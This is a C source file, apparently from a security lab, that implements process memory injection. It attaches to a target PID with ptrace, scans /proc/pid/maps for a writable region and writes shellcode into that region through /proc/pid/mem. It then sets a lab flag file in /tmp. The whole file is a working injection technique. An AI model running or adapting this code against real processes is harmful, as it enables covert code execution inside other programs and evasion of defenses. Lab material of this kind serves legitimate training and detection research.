#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include "lab_common.h"

int inject_proc_mem(pid_t target_pid) {
    char mem_path[64], maps_path[64];
    int mem_fd;
    // unsigned long addr; // UNUSED
    char line[256];
    
    printf("[*] /proc/$pid/mem injection - Target PID: %d\n", target_pid);
    
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("[-] ptrace attach failed");
        return -1;
    }
    waitpid(target_pid, NULL, 0);
    
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", target_pid);
    FILE *maps = fopen(maps_path, "r");
    if (!maps) { perror("[-] maps open failed"); return -1; }
    
    unsigned long target_addr = 0;
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[8];
        sscanf(line, "%lx-%lx %s", &start, &end, perms);
        if (strstr(perms, "rwx") || strstr(perms, "rw-p")) {
            target_addr = start;
            break;
        }
    }
    fclose(maps);
    
    if (!target_addr) {
        printf("[-] No suitable memory region\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    printf("[+] Found region at 0x%lx\n", target_addr);
    
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", target_pid);
    mem_fd = open(mem_path, O_RDWR);
    if (mem_fd == -1) { perror("[-] open mem failed"); return -1; }
    
    lseek(mem_fd, target_addr, SEEK_SET);
    write(mem_fd, shell_pause, shell_pause_len);
    close(mem_fd);
    
    printf("[+] Shellcode written via /proc/$pid/mem\n");
    
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    
    set_flag("/tmp/.procmem_injection_active");
    printf("[+] Process %d injected at 0x%lx\n", target_pid, target_addr);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) { fprintf(stderr, "Usage: %s <pid>\n", argv[0]); return 1; }
    return inject_proc_mem(atoi(argv[1]));
}
